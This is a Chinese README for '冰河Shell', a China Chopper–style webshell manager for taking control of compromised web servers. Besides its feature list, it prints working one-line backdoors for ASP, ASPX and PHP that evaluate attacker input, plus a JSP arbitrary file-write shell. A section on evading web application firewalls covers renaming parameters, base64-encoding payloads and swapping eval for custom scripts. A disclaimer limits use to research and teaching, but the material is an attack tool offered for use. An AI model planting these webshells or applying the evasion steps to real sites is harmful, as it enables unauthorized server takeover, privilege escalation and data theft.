# 作者简介: 
冰河，高级软件架构师，Java编程专家，高级安全工程师，Spring、MySQL内核专家，开源分布式消息引擎Mysum发起者、首席架构师及开发者，Android开源消息组件Android-MQ独立作者，国内知名开源分布式数据库中间件Mycat核心架构师、开发者，精通Java, C, C++, Python, Hadoop大数据生态体系，熟悉MySQL、Redis内核，Android底层架构。多年来致力于分布式系统架构、微服务、分布式数据库、大数据技术的研究，曾主导过众多分布式系统、微服务及大数据项目的架构设计、研发和实施落地。在高并发、高可用、高可扩展性、高可维护性和大数据等领域拥有丰富的经验。对Hadoop、Spark、Storm等大数据框架源码进行过深度分析并具有丰富的实战经验。

# 作者联系方式
QQ：2711098650

# 项目简介
冰河Shell 向中国菜刀致敬

# 免责声明：  
本工具仅限于安全研究与教学使用，用户使用本工具所造成的所有后果，由用户承担全部法律及连带责任！作者不承担任何法律及连带责任。
  
### 为什么开发冰河Shell：  
1、网上的渗透工具存在各种后门，不想自己的成果被他人的后门窃取；  
2、给大家带来的一款纯粹的、无后门的绿色渗透提权利器  

# 版权所有：  
冰河(QQ:2711098650), 翻版必究

# 一、运行环境  
安装了JRE1.7+环境的所有操作系统

# 二、工具说明：  
1.一句话木马提权利器；  
2.比传统的一句话提权工具新增了切换皮肤的能力;  
3.比传统的一句话提权工具新增了自定义脚本类型的能力；  
4.比传统的一句话提权工具新增了设置代理和请求头的能力；  
5.比传统的一句话提权工具新增了多种数据库存储的能力(支持MYSQL、ORACLE、MSSQL、ACCESS的)；  
6.比传统的一句话提权工具新增了支持https协议的能力；  
7.虚拟终端右键复制粘贴功能（快捷键Ctrl+C、Ctrl+V）  
8.虚拟终端上键下键切换历史命令功能  
9.数据库管理右键导出数据功能  
 

# 三、使用说明：
服务端脚本支持ASP、ASPX、PHP、JSP、JSPX、Customize(自定义)。  
代码包含且不限于如下代码（只要能构造出类似eval的函数就行，比如PHP的create_function、assert等）  
### ASP:        
```
<%eval request("Shell")%>
```
### ASP.NET:    
```
<%@ Page Language="Jscript"%><%eval(Request.Item["Shell"],"unsafe");%>
```
### PHP:        
```
<?php @eval($_POST['Shell']);?>
```
### JSP:	   
```
<%if(request.getParameter("f")!=null)(newjava.io.FileOutputStream (application.getRealPath("\\")+request.getParameter("f"))).write (request.getParameter("t").getBytes());%>
```  
提交客户端  
```
<form action="" method="post"><textareaname="t"></textarea><br/><input type="submit"value="提交"></form>
```
### Customize:  
自定义类型,功能代码在服务端保存,理论上支持所有动态脚本,只要正确与C刀进行交互即可。此模式可按需定制，比如只要浏览目录，或是只要虚拟终端功能，代码可以很简短。  

# 四、数据库功能：

首次使用在列表里点击右键，选择数据库管理会提示请先配置数据库，点击配置数据库按钮选择对应的连接方式连接即可。  

# 五、设置功能：

代理功能：在类型处选择代理类型。支持SOCKS、HTTP类型的代理，使用Burp抓取Shell数据，需选择代理类型为HTTP，并填上对应的IP以及端口即可。  
如果想要关闭代理功能，只需要选择代理类型为DIRECT，或者清空用户名或密码，即表示关闭代理。  
  
自定义请求头功能：在文本框里输入要自定义的请求头以及对应的值，可以添加或修改多个请求头。只需要按照如下格式添加即可：  
```
User-Agent:xxx
Cookie:xxx
ms509:Chora
```
如果想要关闭自定义请求头功能，只需要把文本框内容清空，或者选中关闭选项并确定。  

# 六、过WAF

这是一款跨平台的基于配置文件的中国菜刀，把所有操作给予用户来定义，主程序只是图形的展示，以及数据的发送。  
我分开了每一个步骤写入到配置文件里面，用户可以自定义任何代码，包括更改参数名称，参数内容。   
比如：   
```
SKIN=javax.swing.plaf.nimbus.NimbusLookAndFeel 设置皮肤为nimbus 
SPL=->|               			       表示截取数据的开始符号 
SPR=|<-               			       表示截取数据的结束符号 
CODE=code         			       编码参数 
ACTION=action    			       动作参数 
PARAM1=z1         			       参数1 
PARAM2=z2         			       参数2 
PHP_BASE64=1   				       当为PHP时，Z1，Z2参数是否开启自动base64加密，如果想定义自己的加密方式则关闭设置为0 
PHP_MAKE=@eval(base64_decode($_POST[action])); 生成方式，这里可以不用该方式，可以用你任何想要的方式 
PHP_INDEX=...             		       显示主页功能的代码放这儿
PHP_READDICT=...      			       读取主页功能的代码放这儿
PHP_READFILE=...       			       读取文件功能的代码放这儿
PHP_DELETE=...           		       删除文件夹以及文件功能的代码放这儿
PHP_RENAME=...         			       重命名文件夹以及文件功能的代码放这儿
PHP_RETIME=...         			       修改时间功能的代码放这儿
PHP_NEWDICT=...        			       新建目录功能的代码放这儿
PHP_UPLOAD=...          		       上传文件功能的代码放这儿
PHP_DOWNLOAD=...    			       下载文件功能的代码放这儿
PHP_SHELL=...              		       虚拟终端功能的代码放这儿
PHP_DB_MYSQL=...			       管理MYSQL数据库功能的代码放这儿
ASP_...=...
ASPX_...=...
JSP_...=...
```

除了修改以上参数过WAF外，程序还额外提供了一种Customize过WAF的模式。  
Customize模式原本是用于支持一些程序默认不支持的脚本，比如CFM、ASMX、ASHX、PY等等，只要用户自写的脚本能正确与菜刀进行交互即可。  
  
换一个思考方式，如果我们自写一个PHP脚本实现了列文件以及目录的功能，它能够正确的与C刀进行交互，这个时候如果我们选择PHP(Eval)的连接方式就会连接失败。
应该选择Customize模式进行连接。有人说为什么一句话就可以连接，你偏偏还要写这么多代码用Customize模式连接？如果一个很厉害的WAF检测eval,assert等关键词
，你的一句话实在是饶不过，这个时候你可以不用一句话，就在PHP脚本里用正常代码实现列文件以及目录，然后用Customize模式连接就达到了过WAF的目的。
  
Customize(自定义)模式跟其他模式一样，每一个步骤也都写入到配置文件里面，用户同样可以参数名称以及参数内容。
比如你自写了用Customize模式连接的Customize.php服务端。显示主页功能提交的参数应该是：密码=1&action=index以及密码=1&action=readdict。
如果C刀普及以后WAF厂商肯定会把readdict列入黑名单，这个时候你就可以修改readdict的名称为其他名称，同样可以修改action的名称，也可以修改1为其他字符  
```
CUS_MAKE=1 
CUS_INDEX=index 
CUS_READDICT=readdict 
CUS_READFILE=readfile 
CUS_SAVEFILE=savefile 
CUS_DELETE=delete 
CUS_RENAME=rename 
CUS_RETIME=retime 
CUS_NEWDICT=newdict 
CUS_UPLOAD=upload 
CUS_DOWNLOAD=download 
CUS_SHELL=shell
```

# 七、已知问题：
Graphite与Metal类型的皮肤互相之间切换不需要重启Shell，其余类型(Nimbus、Windows、Mac等)的皮肤相互之间切换也不需要重启Shell，
但是这两种类型的皮肤进行切换就需要重启Shell才能完全生效，不然最小化、最大化、关闭按钮不会显示，这是Swing架构遗留的问题。 
